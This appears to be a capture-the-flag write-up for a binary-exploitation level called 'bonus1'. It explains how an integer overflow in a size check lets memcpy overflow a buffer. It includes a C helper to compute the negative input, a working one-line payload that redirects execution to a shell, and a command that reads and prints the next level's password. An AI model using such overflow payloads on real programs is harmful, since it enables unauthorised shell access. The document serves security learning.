# Bonus1

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./bonus1 
  Segmentation fault (core dumped)
  $> ./bonus1 4
  Segmentation fault (core dumped)
  $> ./bonus1 4 2
```

> Seems like this program want us to input two arguments.

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). This time we need to exploit the overflow property of `atoi()` to give us more bytes to copy with `memcpy()`. As seen in the analysis, the buffer has an offset of **56** bytes but we need to pass the check which need our input to be less than **10**. In order to do this, we need to find a negative number that by underflowing gives back a large enough positive number.

```C
#include <stdio.h>

int main(void) {
	int input = 0;

	for (int result = 0; result <= 0 || result > 64; input--) {
		result = input * 4;
	}

	printf("input = %d\n", input);
}
```

> This little program outputs us a potential input which is **-1073741809** which gives us **60** after the multiplication and underflow (**56** offset bytes + **4** bytes for a potential address).

Now, all we have to do is to find an address (`0x08048482`) to re-route the program to spawn a shell since there is a built-in way to do so.

```shell
  $> ./bonus1 -1073741809 $(python -c "print '\x90' * 56 + '\x08\x04\x84\x82'[::-1]")
  $ cat /home/user/bonus2/.pass
  579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

So next user credentials pair is `bonus2:579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`.

Check [here](./source.c) for reproduction source-code of this binary.